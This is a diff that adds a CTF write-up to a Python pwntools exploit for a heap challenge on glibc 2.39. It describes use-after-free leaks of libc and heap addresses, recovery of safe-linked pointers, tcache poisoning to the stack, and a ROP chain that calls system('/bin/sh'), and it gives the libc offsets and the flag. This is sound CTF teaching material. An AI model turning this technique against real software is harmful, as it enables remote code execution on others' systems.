@@ -1,3 +1,24 @@
+# SLIME MACHINE REVENGE
+> Author: 堇姬Naup
+
+tag: pwn, heap, gilbc 2.39
+
+## description
+❤❤❤Do you like slime?Slime is so cute. If you want to marry slime, you can DO ITTTT!❤❤❤
+
+## writeup
+It give me stack address.
+The binary have UAF. We can write and read in the free chunks.
+Use UAF read libc address and find libc base(malloc one 0x420 chunk and then free it. fd/bk have libc address)
+Use UAF read heap address, the first heap's pointer protect is so weak. Use `<< 12` can recover the heap base. Use it caculate all heap's pointer.
+Use tcache poinsoning. And malloc one fake chunk to stack, and wirte return address. Choose exit,  it will jump to return address. We have libc base, and I write ROP chain(gadget from libc).
+RCE~
+
+## flag
+> NHNC{Slimes_issss_so_cute_and_evil!!!So_crazy_you_really_love_SLIME!!!!!}
+
+## exploit
+```py
 from pwn import *
 from libs.NAUP_pwn_lib import *
 import time
@@ -88,13 +109,12 @@ delete(4)
 get(4)
 rcu(b']: ')
 leaklibc = u64(rc(6).ljust(8,b'\x00'))
-libcbase = leaklibc - 2206944
+libcbase = leaklibc - 0x203b20
 
-libc_system = libcbase + 0x50d70
-pop_rdi = libcbase + 0x2a3e5
+libc_system = libcbase + 0x58740
+pop_rdi = libcbase + 0x10f75b
 ret = pop_rdi + 0x1
-binsh = libcbase + 0x1d8678
-
+binsh = libcbase + 0x1cb42f
 Set(3,b'a'*0x8+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(libc_system))
 
 ### INFO
@@ -108,3 +128,4 @@ NAUPINFO("LEAKLIBC",hex(leaklibc))
 NAUPINFO("LIBCBASE",hex(libcbase))
 ### interactive
 ita()
+```
